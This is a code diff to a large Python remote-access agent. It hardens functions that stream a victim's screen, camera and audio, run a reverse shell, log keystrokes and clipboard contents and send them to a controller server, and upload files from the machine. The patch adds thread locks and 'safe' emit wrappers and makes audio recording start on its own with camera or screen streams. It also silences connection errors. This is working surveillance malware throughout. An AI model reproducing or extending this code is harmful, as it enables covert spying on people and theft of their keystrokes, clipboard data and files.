+        log_message("🎤 Auto-stopping audio streaming with screen stream...")
+        stop_audio_streaming()
 
 def start_audio_streaming(agent_id):
     """Start smart audio streaming that automatically chooses WebRTC or Socket.IO."""
@@ -5491,7 +5624,11 @@ def start_audio_streaming(agent_id):
     import queue
     import threading
     
-    if not AUDIO_STREAMING_ENABLED:
+    with _audio_stream_lock:  # ✅ THREAD-SAFE: Prevent race condition
+        if AUDIO_STREAMING_ENABLED:
+            log_message("Audio streaming already running", "warning")
+            return
+        
         AUDIO_STREAMING_ENABLED = True
         
         # Try WebRTC first for low latency
@@ -5525,13 +5662,35 @@ def stop_audio_streaming():
     """Stop modern Opus audio streaming pipeline."""
     global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREADS, audio_capture_queue, audio_encode_queue
     
-    if AUDIO_STREAMING_ENABLED:
+    with _audio_stream_lock:  # ✅ THREAD-SAFE
+        if not AUDIO_STREAMING_ENABLED:
+            return
+        
         AUDIO_STREAMING_ENABLED = False
         
-        # Wait for all threads to stop
-        for thread in AUDIO_STREAM_THREADS:
-            thread.join(timeout=2)
+        # Clear queues to wake up any waiting threads (non-blocking)
+        try:
+            if audio_capture_queue:
+                while not audio_capture_queue.empty():
+                    try:
+                        audio_capture_queue.get_nowait()
+                    except:
+                        break
+        except:
+            pass
         
+        try:
+            if audio_encode_queue:
+                while not audio_encode_queue.empty():
+                    try:
+                        audio_encode_queue.get_nowait()
+                    except:
+                        break
+        except:
+            pass
+        
+        # Don't join threads - they're daemon threads and will exit naturally
+        # This prevents blocking the main thread and causing disconnects
         AUDIO_STREAM_THREADS = []
         audio_capture_queue = None
         audio_encode_queue = None
@@ -5541,7 +5700,11 @@ def start_camera_streaming(agent_id):
     """Start smart camera streaming that automatically chooses WebRTC or Socket.IO."""
     global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREADS
     
-    if not CAMERA_STREAMING_ENABLED:
+    with _camera_stream_lock:  # ✅ THREAD-SAFE: Prevent race condition
+        if CAMERA_STREAMING_ENABLED:
+            log_message("Camera streaming already running", "warning")
+            return
+        
         CAMERA_STREAMING_ENABLED = True
         
         # Try WebRTC first for low latency
@@ -5550,6 +5713,10 @@ def start_camera_streaming(agent_id):
                 # Use WebRTC camera streaming
                 asyncio.create_task(start_webrtc_camera_streaming(agent_id))
                 log_message("Started WebRTC camera streaming (sub-second latency)")
+                
+                # ✅ AUTO-START AUDIO: Start audio streaming with camera stream
+                log_message("🎤 Auto-starting audio streaming with camera stream...")
+                start_audio_streaming(agent_id)
                 return
             except Exception as e:
                 log_message(f"WebRTC camera streaming failed, falling back to Socket.IO: {e}", "warning")
@@ -5557,46 +5724,52 @@ def start_camera_streaming(agent_id):
         # Fallback to Socket.IO
         stream_camera_h264_socketio(agent_id)
         log_message("Started Socket.IO camera stream (fallback mode).")
+        
+        # ✅ AUTO-START AUDIO: Start audio streaming with camera stream
+        log_message("🎤 Auto-starting audio streaming with camera stream...")
+        start_audio_streaming(agent_id)
 
 def stop_camera_streaming():
     """Stop modern H.264 camera streaming pipeline."""
     global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREADS, camera_capture_queue, camera_encode_queue
     
-    if CAMERA_STREAMING_ENABLED:
+    with _camera_stream_lock:  # ✅ THREAD-SAFE
+        if not CAMERA_STREAMING_ENABLED:
+            return
+        
         CAMERA_STREAMING_ENABLED = False
         
-        # Wait for all threads to stop
-        for thread in CAMERA_STREAM_THREADS:
-            thread.join(timeout=2)
+        # Clear queues to wake up any waiting threads (non-blocking)
+        try:
+            if camera_capture_queue:
+                while not camera_capture_queue.empty():
+                    try:
+                        camera_capture_queue.get_nowait()
+                    except:
+                        break
+        except:
+            pass
         
+        try:
+            if camera_encode_queue:
+                while not camera_encode_queue.empty():
+                    try:
+                        camera_encode_queue.get_nowait()
+                    except:
+                        break
+        except:
+            pass
+        
+        # Don't join threads - they're daemon threads and will exit naturally
+        # This prevents blocking the main thread and causing disconnects
         CAMERA_STREAM_THREADS = []
         camera_capture_queue = None
         camera_encode_queue = None
         log_message("Stopped camera stream.")
-
-def set_streaming_fps(fps_value):
-    """Dynamically set FPS for all active streams."""
-    global TARGET_FPS, TARGET_CAMERA_FPS
-    
-    try:
-        fps = int(fps_value)
-        # Enforce 30-60 FPS range
-        fps = max(30, min(60, fps))
         
-        # Update global FPS targets
-        TARGET_FPS = fps
-        TARGET_CAMERA_FPS = fps
-        
-        # Update WebRTC streams if active
-        if WEBRTC_STREAMS:
-            for key, track in WEBRTC_STREAMS.items():
-                if hasattr(track, 'set_fps'):
-                    track.set_fps(fps)
-        
-        log_message(f"Streaming FPS set to {fps}")
-        return f"FPS updated to {fps}"
-    except ValueError:
-        return "Invalid FPS value. Use: set-fps:30 or set-fps:60"
+        # ✅ AUTO-STOP AUDIO: Stop audio streaming with camera stream
+        log_message("🎤 Auto-stopping audio streaming with camera stream...")
+        stop_audio_streaming()
 
 # ========================================================================================
 # WEBRTC PEER CONNECTION MANAGEMENT FOR LOW-LATENCY STREAMING
@@ -5614,7 +5787,7 @@ async def create_webrtc_peer_connection(agent_id, enable_screen=True, enable_aud
         
         # Add media tracks
         if enable_screen:
-            screen_track = ScreenTrack(agent_id, target_fps=50, quality=85)
+            screen_track = ScreenTrack(agent_id, target_fps=30, quality=85)
             pc.addTrack(screen_track)
             WEBRTC_STREAMS[f"{agent_id}_screen"] = screen_track
             log_message(f"Added screen track to WebRTC connection for agent {agent_id}")
@@ -5626,7 +5799,7 @@ async def create_webrtc_peer_connection(agent_id, enable_screen=True, enable_aud
             log_message(f"Added audio track to WebRTC connection for agent {agent_id}")
         
         if enable_camera:
-            camera_track = CameraTrack(agent_id, camera_index=0, target_fps=50, quality=85)
+            camera_track = CameraTrack(agent_id, camera_index=0, target_fps=30, quality=85)
             pc.addTrack(camera_track)
             WEBRTC_STREAMS[f"{agent_id}_camera"] = camera_track
             log_message(f"Added camera track to WebRTC connection for agent {agent_id}")
@@ -5778,7 +5951,7 @@ def start_webrtc_streaming(agent_id, enable_screen=True, enable_audio=True, enab
                 if offer:
                     # Send offer to controller via Socket.IO
                     if SOCKETIO_AVAILABLE:
-                        sio.emit('webrtc_offer', {
+                        safe_emit('webrtc_offer', {  # ✅ SAFE
                             'agent_id': agent_id,
                             'offer_sdp': offer.sdp,
                             'enable_screen': enable_screen,
@@ -5939,7 +6112,7 @@ def adaptive_bitrate_control(agent_id, current_quality='auto'):
             
             # Emit quality change event to controller
             if SOCKETIO_AVAILABLE:
-                sio.emit('webrtc_quality_change', {
+                safe_emit('webrtc_quality_change', {  # ✅ SAFE
                     'agent_id': agent_id,
                     'old_quality': current_quality,
                     'new_quality': target_quality,
@@ -5976,13 +6149,13 @@ def implement_frame_dropping(agent_id, load_threshold=0.8):
                 for key, track in WEBRTC_STREAMS.items():
                     if key.startswith(f"{agent_id}_"):
                         if hasattr(track, 'set_fps'):
-                            current_fps = getattr(track, '_target_fps', 50)
-                            new_fps = max(40, int(current_fps * 0.8))  # Reduce FPS by 20%, min 40 FPS
+                            current_fps = getattr(track, '_target_fps', 30)
+                            new_fps = max(15, int(current_fps * 0.7))  # Reduce FPS by 30%
                             track.set_fps(new_fps)
                 
                 # Emit frame dropping event to controller
                 if SOCKETIO_AVAILABLE:
-                    sio.emit('webrtc_frame_dropping', {
+                    safe_emit('webrtc_frame_dropping', {  # ✅ SAFE
                         'agent_id': agent_id,
                         'system_load': system_load,
                         'load_threshold': load_threshold,
@@ -6029,7 +6202,7 @@ def monitor_connection_quality(agent_id):
             quality_issues.append('packet_loss')
         
         # Check FPS
-        current_fps = 50  # Default, should get from actual track
+        current_fps = 30  # Default, should get from actual track
         for key, track in WEBRTC_STREAMS.items():
             if key.startswith(f"{agent_id}_"):
                 if hasattr(track, '_target_fps'):
@@ -6721,7 +6894,12 @@ def reverse_shell_handler(agent_id):
 def start_reverse_shell(agent_id):
     """Start the reverse shell connection."""
     global REVERSE_SHELL_ENABLED, REVERSE_SHELL_THREAD
-    if not REVERSE_SHELL_ENABLED:
+    
+    with _reverse_shell_lock:  # ✅ THREAD-SAFE: Prevent race condition
+        if REVERSE_SHELL_ENABLED:
+            log_message("Reverse shell already running", "warning")
+            return
+        
         REVERSE_SHELL_ENABLED = True
         REVERSE_SHELL_THREAD = threading.Thread(target=reverse_shell_handler, args=(agent_id,))
         REVERSE_SHELL_THREAD.daemon = True
@@ -6731,18 +6909,18 @@ def start_reverse_shell(agent_id):
 def stop_reverse_shell():
     """Stop the reverse shell connection."""
     global REVERSE_SHELL_ENABLED, REVERSE_SHELL_THREAD, REVERSE_SHELL_SOCKET
-    if REVERSE_SHELL_ENABLED:
+    
+    with _reverse_shell_lock:  # ✅ THREAD-SAFE
+        if not REVERSE_SHELL_ENABLED:
+            return
+        
         REVERSE_SHELL_ENABLED = False
         if REVERSE_SHELL_SOCKET:
             try:
                 REVERSE_SHELL_SOCKET.close()
             except:
                 pass
-        if REVERSE_SHELL_THREAD and REVERSE_SHELL_THREAD.is_alive():
-            try:
-                REVERSE_SHELL_THREAD.join(timeout=1)  # Reduced timeout
-            except Exception as e:
-                log_message(f"Warning: Could not join reverse shell thread: {e}")
+        # Don't join - daemon thread will exit naturally (prevents blocking)
         REVERSE_SHELL_THREAD = None
         log_message("Stopped reverse shell.")
 # --- Voice Control Functions ---
@@ -6835,7 +7013,12 @@ def execute_voice_command(command, agent_id):
 def start_voice_control(agent_id):
     """Start voice control functionality."""
     global VOICE_CONTROL_ENABLED, VOICE_CONTROL_THREAD
-    if not VOICE_CONTROL_ENABLED:
+    
+    with _voice_control_lock:  # ✅ THREAD-SAFE: Prevent race condition
+        if VOICE_CONTROL_ENABLED:
+            log_message("Voice control already running", "warning")
+            return
+        
         VOICE_CONTROL_ENABLED = True
         VOICE_CONTROL_THREAD = threading.Thread(target=voice_control_handler, args=(agent_id,))
         VOICE_CONTROL_THREAD.daemon = True
@@ -6845,10 +7028,13 @@ def start_voice_control(agent_id):
 def stop_voice_control():
     """Stop voice control functionality."""
     global VOICE_CONTROL_ENABLED, VOICE_CONTROL_THREAD
-    if VOICE_CONTROL_ENABLED:
+    
+    with _voice_control_lock:  # ✅ THREAD-SAFE
+        if not VOICE_CONTROL_ENABLED:
+            return
+        
         VOICE_CONTROL_ENABLED = False
-        if VOICE_CONTROL_THREAD:
-            VOICE_CONTROL_THREAD.join(timeout=2)
+        # Don't join - daemon thread will exit naturally (prevents blocking)
         VOICE_CONTROL_THREAD = None
         log_message("Stopped voice control.")
 
@@ -7100,45 +7286,56 @@ def keylogger_worker(agent_id):
     """Keylogger worker thread that sends data periodically."""
     global KEYLOGGER_ENABLED, KEYLOG_BUFFER
     
-    while KEYLOGGER_ENABLED:
-        try:
-            if KEYLOG_BUFFER:
-                # Send accumulated keylog data
-                data_to_send = KEYLOG_BUFFER.copy()
-                KEYLOG_BUFFER = []
-                
-                # Use socket.io for better performance and consistency
-                try:
-                    if sio and sio.connected:
-                        for entry in data_to_send:
-                            sio.emit('keylog_data', {
-                                'agent_id': agent_id,
-                                'data': entry
-                            })
-                    else:
-                        log_message("Socket.io not connected, buffering keylog data", "warning")
-                        # Re-add data to buffer if connection is down
-                        KEYLOG_BUFFER.extend(data_to_send)
-                except Exception as e:
-                    log_message(f"Keylogger socket.io error: {e}")
-                    # Fallback to HTTP if socket.io fails
-                    if REQUESTS_AVAILABLE:
-                        try:
-                            url = f"{SERVER_URL}/keylog_data/{agent_id}"
+    try:
+        while KEYLOGGER_ENABLED:
+            try:
+                if KEYLOG_BUFFER:
+                    # Send accumulated keylog data
+                    data_to_send = KEYLOG_BUFFER.copy()
+                    KEYLOG_BUFFER = []
+                    
+                    # Use socket.io for better performance and consistency
+                    try:
+                        if sio and sio.connected:
                             for entry in data_to_send:
-                                requests.post(url, json={"data": entry}, timeout=5)
-                        except Exception as http_e:
-                            log_message(f"Keylogger HTTP fallback error: {http_e}")
-                            # Re-add data to buffer for next attempt
+                                safe_emit('keylog_data', {
+                                    'agent_id': agent_id,
+                                    'data': entry
+                                })
+                        else:
+                            log_message("Socket.io not connected, buffering keylog data", "warning")
+                            # Re-add data to buffer if connection is down
                             KEYLOG_BUFFER.extend(data_to_send)
-                    else:
-                        log_message("HTTP fallback not available, re-buffering keylog data", "warning")
-                        KEYLOG_BUFFER.extend(data_to_send)
-            
-            time.sleep(5)  # Send data every 5 seconds
-        except Exception as e:
-            log_message(f"Keylogger worker error: {e}")
-            time.sleep(5)
+                    except Exception as e:
+                        error_msg = str(e)
+                        # Silence connection errors
+                        if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
+                            log_message(f"Keylogger socket.io error: {e}")
+                        # Fallback to HTTP if socket.io fails
+                        if REQUESTS_AVAILABLE:
+                            try:
+                                url = f"{SERVER_URL}/keylog_data/{agent_id}"
+                                for entry in data_to_send:
+                                    requests.post(url, json={"data": entry}, timeout=5)
+                            except Exception as http_e:
+                                log_message(f"Keylogger HTTP fallback error: {http_e}")
+                                # Re-add data to buffer for next attempt
+                                KEYLOG_BUFFER.extend(data_to_send)
+                        else:
+                            log_message("HTTP fallback not available, re-buffering keylog data", "warning")
+                            KEYLOG_BUFFER.extend(data_to_send)
+                
+                time.sleep(5)  # Send data every 5 seconds
+            except KeyboardInterrupt:
+                log_message("Keylogger worker interrupted")
+                break
+            except Exception as e:
+                log_message(f"Keylogger worker error: {e}")
+                time.sleep(5)
+    except KeyboardInterrupt:
+        log_message("Keylogger worker interrupted")
+    
+    log_message("Keylogger worker stopped")
 
 def start_keylogger(agent_id):
     """Start the keylogger."""
@@ -7148,7 +7345,11 @@ def start_keylogger(agent_id):
         log_message("Error: pynput not available for keylogger", "error")
         return False
     
-    if not KEYLOGGER_ENABLED:
+    with _keylogger_lock:  # ✅ THREAD-SAFE: Prevent race condition
+        if KEYLOGGER_ENABLED:
+            log_message("Keylogger already running", "warning")
+            return True
+        
         try:
             KEYLOGGER_ENABLED = True
             
@@ -7171,17 +7372,17 @@ def start_keylogger(agent_id):
             log_message(f"Failed to start keylogger: {e}", "error")
             KEYLOGGER_ENABLED = False
             return False
-    else:
-        log_message("Keylogger already enabled")
-        return True
 
 def stop_keylogger():
     """Stop the keylogger."""
     global KEYLOGGER_ENABLED, KEYLOGGER_THREAD
-    if KEYLOGGER_ENABLED:
+    
+    with _keylogger_lock:  # ✅ THREAD-SAFE
+        if not KEYLOGGER_ENABLED:
+            return
+        
         KEYLOGGER_ENABLED = False
-        if KEYLOGGER_THREAD:
-            KEYLOGGER_THREAD.join(timeout=2)
+        # Don't join - daemon thread will exit naturally (prevents blocking)
         KEYLOGGER_THREAD = None
         log_message("Stopped keylogger.")
 
@@ -7209,45 +7410,61 @@ def clipboard_monitor_worker(agent_id):
     """Clipboard monitor worker thread."""
     global CLIPBOARD_MONITOR_ENABLED, LAST_CLIPBOARD_CONTENT
     
-    while CLIPBOARD_MONITOR_ENABLED:
-        try:
-            current_content = get_clipboard_content()
-            if current_content and current_content != LAST_CLIPBOARD_CONTENT:
-                timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
-                clipboard_entry = f"{timestamp}: {current_content[:500]}{'...' if len(current_content) > 500 else ''}"
-                
-                # Use socket.io for better performance and consistency
-                try:
-                    if sio and sio.connected:
-                        sio.emit('clipboard_data', {
-                            'agent_id': agent_id,
-                            'data': clipboard_entry
-                        })
-                        LAST_CLIPBOARD_CONTENT = current_content
-                    else:
-                        log_message("Socket.io not connected for clipboard data", "warning")
-                except Exception as e:
-                    log_message(f"Clipboard socket.io error: {e}")
-                    # Fallback to HTTP if socket.io fails
-                    if REQUESTS_AVAILABLE:
-                        try:
-                            url = f"{SERVER_URL}/clipboard_data/{agent_id}"
-                            requests.post(url, json={"data": clipboard_entry}, timeout=5)
+    try:
+        while CLIPBOARD_MONITOR_ENABLED:
+            try:
+                current_content = get_clipboard_content()
+                if current_content and current_content != LAST_CLIPBOARD_CONTENT:
+                    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
+                    clipboard_entry = f"{timestamp}: {current_content[:500]}{'...' if len(current_content) > 500 else ''}"
+                    
+                    # Use socket.io for better performance and consistency
+                    try:
+                        if sio and sio.connected:
+                            safe_emit('clipboard_data', {  # ✅ SAFE
+                                'agent_id': agent_id,
+                                'data': clipboard_entry
+                            })
                             LAST_CLIPBOARD_CONTENT = current_content
-                        except Exception as http_e:
-                            log_message(f"Clipboard HTTP fallback error: {http_e}")
-                    else:
-                        log_message("HTTP fallback not available for clipboard data", "warning")
-            
-            time.sleep(2)  # Check clipboard every 2 seconds
-        except Exception as e:
-            log_message(f"Clipboard monitor worker error: {e}")
-            time.sleep(2)
+                        else:
+                            log_message("Socket.io not connected for clipboard data", "warning")
+                    except Exception as e:
+                        error_msg = str(e)
+                        # Silence connection errors
+                        if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
+                            log_message(f"Clipboard socket.io error: {e}")
+                        # Fallback to HTTP if socket.io fails
+                        if REQUESTS_AVAILABLE:
+                            try:
+                                url = f"{SERVER_URL}/clipboard_data/{agent_id}"
+                                requests.post(url, json={"data": clipboard_entry}, timeout=5)
+                                LAST_CLIPBOARD_CONTENT = current_content
+                            except Exception as http_e:
+                                log_message(f"Clipboard HTTP fallback error: {http_e}")
+                        else:
+                            log_message("HTTP fallback not available for clipboard data", "warning")
+                
+                time.sleep(2)  # Check clipboard every 2 seconds
+            except KeyboardInterrupt:
+                log_message("Clipboard monitor worker interrupted")
+                break
+            except Exception as e:
+                log_message(f"Clipboard monitor worker error: {e}")
+                time.sleep(2)
+    except KeyboardInterrupt:
+        log_message("Clipboard monitor worker interrupted")
+    
+    log_message("Clipboard monitor worker stopped")
 
 def start_clipboard_monitor(agent_id):
     """Start clipboard monitoring."""
     global CLIPBOARD_MONITOR_ENABLED, CLIPBOARD_MONITOR_THREAD
-    if not CLIPBOARD_MONITOR_ENABLED:
+    
+    with _clipboard_lock:  # ✅ THREAD-SAFE: Prevent race condition
+        if CLIPBOARD_MONITOR_ENABLED:
+            log_message("Clipboard monitor already running", "warning")
+            return
+        
         CLIPBOARD_MONITOR_ENABLED = True
         CLIPBOARD_MONITOR_THREAD = threading.Thread(target=clipboard_monitor_worker, args=(agent_id,))
         CLIPBOARD_MONITOR_THREAD.daemon = True
@@ -7257,10 +7474,13 @@ def start_clipboard_monitor(agent_id):
 def stop_clipboard_monitor():
     """Stop clipboard monitoring."""
     global CLIPBOARD_MONITOR_ENABLED, CLIPBOARD_MONITOR_THREAD
-    if CLIPBOARD_MONITOR_ENABLED:
+    
+    with _clipboard_lock:  # ✅ THREAD-SAFE
+        if not CLIPBOARD_MONITOR_ENABLED:
+            return
+        
         CLIPBOARD_MONITOR_ENABLED = False
-        if CLIPBOARD_MONITOR_THREAD:
-            CLIPBOARD_MONITOR_THREAD.join(timeout=2)
+        # Don't join - daemon thread will exit naturally (prevents blocking)
         CLIPBOARD_MONITOR_THREAD = None
         log_message("Stopped clipboard monitor.")
 
@@ -7282,23 +7502,30 @@ def send_file_chunked_to_controller(file_path, agent_id, destination_path=None):
             if not chunk:
                 break
             chunk_b64 = 'data:application/octet-stream;base64,' + base64.b64encode(chunk).decode('utf-8')
-            sio.emit('file_chunk_from_agent', {
+            
+            # ✅ SAFE EMIT: Check connection before sending
+            if not safe_emit('file_chunk_from_agent', {
                 'agent_id': agent_id,
                 'filename': filename,
                 'chunk': chunk_b64,
                 'offset': offset,
                 'total_size': total_size,
                 'destination_path': destination_path or file_path
-            })
+            }):
+                log_message(f"Failed to send chunk {chunk_count}, connection lost", "error")
+                return f"File upload failed at chunk {chunk_count}: Connection lost"
+            
             offset += len(chunk)
             chunk_count += 1
             log_message(f"Sent chunk {chunk_count}: {len(chunk)} bytes at offset {offset}")
+    
     # Notify upload complete
-    sio.emit('upload_file_end', {
+    if not safe_emit('upload_file_end', {
         'agent_id': agent_id,
         'filename': filename,
         'destination_path': destination_path or file_path
-    })
+    }):
+        log_message("Failed to send upload completion notification", "warning")
     log_message(f"File upload complete notification sent for {filename}")
     return f"File {file_path} sent to controller in {chunk_count} chunks"
 
@@ -7322,7 +7549,7 @@ def register_socketio_handlers():
     def connect():
         agent_id = get_or_create_agent_id()
         log_message(f"Connected to controller, registering agent {agent_id}")
-        sio.emit('agent_connect', {'agent_id': agent_id})
+        safe_emit('agent_connect', {'agent_id': agent_id})  # ✅ SAFE
     
     # Register file transfer handlers
     sio.on('file_chunk_from_operator')(on_file_chunk_from_operator)
@@ -7411,7 +7638,7 @@ def on_file_chunk_from_operator(data):
             log_message(f"File {filename}: received {received_size}/{total_size} bytes ({progress}%)")
             
             # ✅ SEND PROGRESS UPDATE TO UI!
-            sio.emit('file_upload_progress', {
+            safe_emit('file_upload_progress', {
                 'agent_id': get_or_create_agent_id(),
                 'filename': filename,
                 'destination_path': destination_path,
@@ -7424,7 +7651,7 @@ def on_file_chunk_from_operator(data):
             log_message(f"File {filename}: received {received_size} bytes (waiting for total_size or completion event)")
             
             # ✅ SEND PROGRESS UPDATE (unknown total)
-            sio.emit('file_upload_progress', {
+            safe_emit('file_upload_progress', {
                 'agent_id': get_or_create_agent_id(),
                 'filename': filename,
                 'destination_path': destination_path,
@@ -7440,7 +7667,7 @@ def on_file_chunk_from_operator(data):
             _save_completed_file(destination_path, buffers[destination_path])
             
             # ✅ SEND COMPLETION EVENT TO UI!
-            sio.emit('file_upload_complete', {
+            safe_emit('file_upload_complete', {
                 'agent_id': get_or_create_agent_id(),
                 'filename': filename,
                 'destination_path': destination_path,
@@ -7495,7 +7722,7 @@ def on_file_upload_complete_from_operator(data):
             
             # ✅ SEND FINAL UPLOAD COMPLETION WITH 100% PROGRESS!
             file_size = sum(len(c[1]) for c in buffer_data['chunks'])
-            sio.emit('file_upload_progress', {
+            safe_emit('file_upload_progress', {
                 'agent_id': get_or_create_agent_id(),
                 'filename': filename,
                 'destination_path': destination_path,
@@ -7503,7 +7730,7 @@ def on_file_upload_complete_from_operator(data):
                 'total': file_size,
                 'progress': 100  # ✅ 100% complete!
             })
-            sio.emit('file_upload_complete', {
+            safe_emit('file_upload_complete', {
                 'agent_id': get_or_create_agent_id(),
                 'filename': filename,
                 'destination_path': destination_path,
@@ -7566,7 +7793,7 @@ def on_request_file_chunk_from_agent(data):
             log_message(f"  - {path}")
         
         # Send error back to UI
-        sio.emit('file_chunk_from_agent', {
+        safe_emit('file_chunk_from_agent', {
             'agent_id': get_or_create_agent_id(),
             'filename': filename,
             'error': f'File not found: {filename}. Last browsed dir: {LAST_BROWSED_DIRECTORY or "None"}'
@@ -7591,7 +7818,7 @@ def on_request_file_chunk_from_agent(data):
                 chunk_b64 = 'data:application/octet-stream;base64,' + base64.b64encode(chunk).decode('utf-8')
                 
                 # Send file chunk
-                sio.emit('file_chunk_from_agent', {
+                safe_emit('file_chunk_from_agent', {
                     'agent_id': agent_id,
                     'filename': filename_only,
                     'chunk': chunk_b64,
@@ -7607,7 +7834,7 @@ def on_request_file_chunk_from_agent(data):
                 log_message(f"Sent chunk {chunk_count}: {len(chunk)} bytes at offset {offset} ({progress}%)")
                 
                 # ✅ SEND DOWNLOAD PROGRESS UPDATE TO UI!
-                sio.emit('file_download_progress', {
+                safe_emit('file_download_progress', {
                     'agent_id': agent_id,
                     'filename': filename_only,
                     'sent': offset,
@@ -7618,7 +7845,7 @@ def on_request_file_chunk_from_agent(data):
         log_message(f"File {file_path} sent to controller in {chunk_count} chunks")
         
         # ✅ SEND DOWNLOAD COMPLETION EVENT TO UI!
-        sio.emit('file_download_complete', {
+        safe_emit('file_download_complete', {
             'agent_id': agent_id,
             'filename': filename_only,
             'size': total_size,
@@ -7942,12 +8169,6 @@ def main_loop(agent_id):
                     output = f"Internal command '{command}' executed successfully"
                 except Exception as e:
                     output = f"Internal command '{command}' failed: {e}"
-            elif command.startswith("set-fps:"):
-                try:
-                    fps_value = command.split(":")[1]
-                    output = set_streaming_fps(fps_value)
-                except Exception as e:
-                    output = f"Failed to set FPS: {e}"
             elif command == "list-processes":
                 try:
                     import psutil
@@ -7968,7 +8189,7 @@ def main_loop(agent_id):
                             'nice': info.get('nice') or 0,
                             'num_threads': info.get('num_threads') or 0,
                         })
-                    sio.emit('process_list', {'agent_id': agent_id, 'processes': proc_list})
+                    safe_emit('process_list', {'agent_id': agent_id, 'processes': proc_list})
                     output = f"Sent {len(proc_list)} processes"
                 except Exception as e:
                     output = f"Error listing processes: {e}"
@@ -7992,7 +8213,7 @@ def main_loop(agent_id):
                                 })
                             except Exception:
                                 continue
-                    sio.emit('file_list', {'agent_id': agent_id, 'path': path, 'files': entries})
+                    safe_emit('file_list', {'agent_id': agent_id, 'path': path, 'files': entries})
                     output = f"Listed {len(entries)} entries in {path}"
                 except Exception as e:
                     output = f"Error listing directory: {e}"
@@ -8420,9 +8641,9 @@ except ImportError:
     HAS_XXHASH = False
 
 class HighPerformanceCapture:
-    """High-performance screen capture optimized for real-time monitoring at 40-60 FPS"""
+    """High-performance screen capture optimized for real-time monitoring at 2 FPS (0.5-second intervals)"""
     
-    def __init__(self, target_fps: int = 50, quality: int = 85, 
+    def __init__(self, target_fps: int = 2, quality: int = 85, 
                  enable_delta_compression: bool = True):
         self.target_fps = target_fps
         self.frame_time = 1.0 / target_fps
@@ -8652,7 +8873,7 @@ class HighPerformanceCapture:
     
     def set_fps(self, fps: int):
         """Dynamically adjust target FPS"""
-        self.target_fps = max(40, min(60, fps))  # Enforce 40-60 FPS range
+        self.target_fps = max(10, min(120, fps))
         self.frame_time = 1.0 / self.target_fps
     
     def __del__(self):
@@ -10441,7 +10662,7 @@ def connect():
     # Connection message
     log_message(f"Connected to server. Registering with agent_id: {agent_id}")
     
-    sio.emit('agent_connect', {'agent_id': agent_id})
+    safe_emit('agent_connect', {'agent_id': agent_id})
     
     # Emit WebRTC status if available
     if AIORTC_AVAILABLE:
@@ -10453,14 +10674,29 @@ def connect():
     try:
         import psutil
         def _telemetry_loop():
-            while True:
-                try:
-                    cpu = psutil.cpu_percent(interval=1)
-                    mem = psutil.virtual_memory().percent
-                    net = 0
-                    sio.emit('agent_telemetry', {'agent_id': agent_id, 'cpu': cpu, 'memory': mem, 'network': net})
-                except Exception:
-                    pass
+            try:
+                while sio and sio.connected:
+                    try:
+                        cpu = psutil.cpu_percent(interval=1)
+                        mem = psutil.virtual_memory().percent
+                        net = 0
+                        if sio.connected:
+                            safe_emit('agent_telemetry', {'agent_id': agent_id, 'cpu': cpu, 'memory': mem, 'network': net})  # ✅ SAFE
+                        else:
+                            time.sleep(5)
+                    except KeyboardInterrupt:
+                        log_message("Telemetry worker interrupted")
+                        break
+                    except Exception as e:
+                        error_msg = str(e)
+                        # Silence connection errors
+                        if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
+                            log_message(f"Telemetry error: {e}", "warning")
+                        time.sleep(5)
+                        break
+            except KeyboardInterrupt:
+                log_message("Telemetry worker interrupted")
+            log_message("Telemetry worker stopped")
         threading.Thread(target=_telemetry_loop, daemon=True).start()
     except Exception:
         pass
@@ -10478,11 +10714,6 @@ def on_start_stream(data):
         log_message("Socket.IO not available, cannot handle start_stream", "warning")
         return
     
-    # CRITICAL: Check if socket.io is actually connected before starting streams
-    if not hasattr(sio, 'connected') or not sio.connected:
-        log_message(f"[START_STREAM] Socket.IO not connected yet, deferring stream start", "warning")
-        return
-    
     agent_id = get_or_create_agent_id()
     stream_type = data.get('type', 'screen')  # screen, camera, or audio
     quality = data.get('quality', 'high')
@@ -10493,7 +10724,7 @@ def on_start_stream(data):
         if stream_type == 'screen':
             start_streaming(agent_id)
             log_message(f"[START_STREAM] Screen streaming started")
-            sio.emit('stream_started', {
+            safe_emit('stream_started', {
                 'agent_id': agent_id,
                 'type': 'screen',
                 'status': 'success'
@@ -10501,7 +10732,7 @@ def on_start_stream(data):
         elif stream_type == 'camera':
             start_camera_streaming(agent_id)
             log_message(f"[START_STREAM] Camera streaming started")
-            sio.emit('stream_started', {
+            safe_emit('stream_started', {
                 'agent_id': agent_id,
                 'type': 'camera',
                 'status': 'success'
@@ -10509,21 +10740,21 @@ def on_start_stream(data):
         elif stream_type == 'audio':
             start_audio_streaming(agent_id)
             log_message(f"[START_STREAM] Audio streaming started")
-            sio.emit('stream_started', {
+            safe_emit('stream_started', {
                 'agent_id': agent_id,
                 'type': 'audio',
                 'status': 'success'
             })
         else:
             log_message(f"[START_STREAM] Unknown stream type: {stream_type}", "warning")
-            sio.emit('stream_error', {
+            safe_emit('stream_error', {
                 'agent_id': agent_id,
                 'type': stream_type,
                 'error': f'Unknown stream type: {stream_type}'
             })
     except Exception as e:
         log_message(f"[START_STREAM] Error starting {stream_type} stream: {e}", "error")
-        sio.emit('stream_error', {
+        safe_emit('stream_error', {
             'agent_id': agent_id,
             'type': stream_type,
             'error': str(e)
@@ -10544,7 +10775,7 @@ def on_stop_stream(data):
         if stream_type == 'screen':
             stop_streaming()
             log_message(f"[STOP_STREAM] Screen streaming stopped")
-            sio.emit('stream_stopped', {
+            safe_emit('stream_stopped', {
                 'agent_id': agent_id,
                 'type': 'screen',
                 'status': 'success'
@@ -10552,7 +10783,7 @@ def on_stop_stream(data):
         elif stream_type == 'camera':
             stop_camera_streaming()
             log_message(f"[STOP_STREAM] Camera streaming stopped")
-            sio.emit('stream_stopped', {
+            safe_emit('stream_stopped', {
                 'agent_id': agent_id,
                 'type': 'camera',
                 'status': 'success'
@@ -10560,7 +10791,7 @@ def on_stop_stream(data):
         elif stream_type == 'audio':
             stop_audio_streaming()
             log_message(f"[STOP_STREAM] Audio streaming stopped")
-            sio.emit('stream_stopped', {
+            safe_emit('stream_stopped', {
                 'agent_id': agent_id,
                 'type': 'audio',
                 'status': 'success'
